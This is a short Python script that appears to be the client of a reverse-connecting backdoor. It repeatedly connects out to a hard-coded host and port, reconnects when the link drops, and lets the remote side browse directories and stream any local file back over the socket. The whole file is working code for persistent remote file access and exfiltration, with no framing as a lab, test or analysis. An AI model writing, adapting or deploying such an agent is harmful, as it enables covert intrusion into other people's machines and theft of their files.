#!/usr/bin/python3
import socket
import time
import os


def connect_server():

    connected = False

    while not connected:
        try:
            s.connect((host, port))
            connected = True
            print("Connected.")
        except socket.error:
            print("Trying to connect...")
            time.sleep(3)


def ls(cmd):
    if len(cmd) == 1:
        cmd.append('.')
    try:
        result = '  '.join(os.listdir(cmd[1]))
    except:
        result = "No such file or directory."
    return result


def cd(cmd):
    if len(cmd) == 1:
        cmd.append(os.environ["HOME"])
    try:
        os.chdir(cmd[1])
    except:
        return "No such file or directory."
    return '  '.join(os.listdir())


def file_transfer(file_name):

    try:
        f = open(os.getcwd()+"/"+file_name[1], "rb")

        while True:
            data = f.read(4096)
            if not data:
                break
            s.send(data)
        f.close()
        time.sleep(0.8)
        s.send(bytes("EOFX", "UTF-8"))
        time.sleep(0.8)

        return "File transfered."
    except:
        return "Failed to transfer a file."


def file_browser():

    s.send(bytes(os.getcwd(), "UTF-8"))

    while True:
        cmd = s.recv(4096)
        cmd = cmd.decode("UTF-8")
        cmd = cmd.split("~")

        if cmd[0] == 'ls':
            asd = ls(cmd)
            s.send(bytes(asd, "UTF-8"))
        elif cmd[0] == 'cd':
            asd = cd(cmd)
            s.send(bytes(asd, "UTF-8"))
        elif cmd[0] == 'cp':
            asd = file_transfer(cmd)
            s.send(bytes(asd, "UTF-8"))
        elif cmd[0] == 'pwd':
            asd = os.getcwd()
            s.send(bytes(asd, "UTF-8"))
        elif cmd[0] == 'exit':
            break
        else:
            s.send(bytes("Command not found.", "UTF-8"))


def main():

    connect_server()

    while True:
        data = s.recv(4096).decode("UTF-8")

        if data:
            if data == '1':
                file_browser()
        else:
            print("Connection lost.")
            connect_server()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "roll"
port = 1234

if __name__ == "__main__":
    main()
